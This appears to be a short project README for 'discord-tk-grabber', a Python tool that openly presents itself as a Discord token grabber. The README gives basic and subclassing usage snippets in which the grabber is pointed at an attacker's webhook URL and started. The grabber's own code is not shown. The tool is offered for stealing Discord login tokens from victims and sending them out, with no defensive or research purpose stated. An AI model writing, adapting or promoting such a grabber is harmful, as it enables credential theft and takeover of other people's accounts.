# discord-tk-grabber
Advanced discord token grabber (with webhook support)

# basic usage
```python
grabber = Grabber()
grabber.add_webhook('webhook URL here')
grabber.start()

```

# advanced usage
```python

class Program(Grabber):
  def __init__(self):
    super.__init__()
    # do whatever you want here

  def start(self):
    # do whatever you want here

    super().start()

grabber = Grabber()
grabber.add_webhook('webhook URL here')
grabber.start()
```
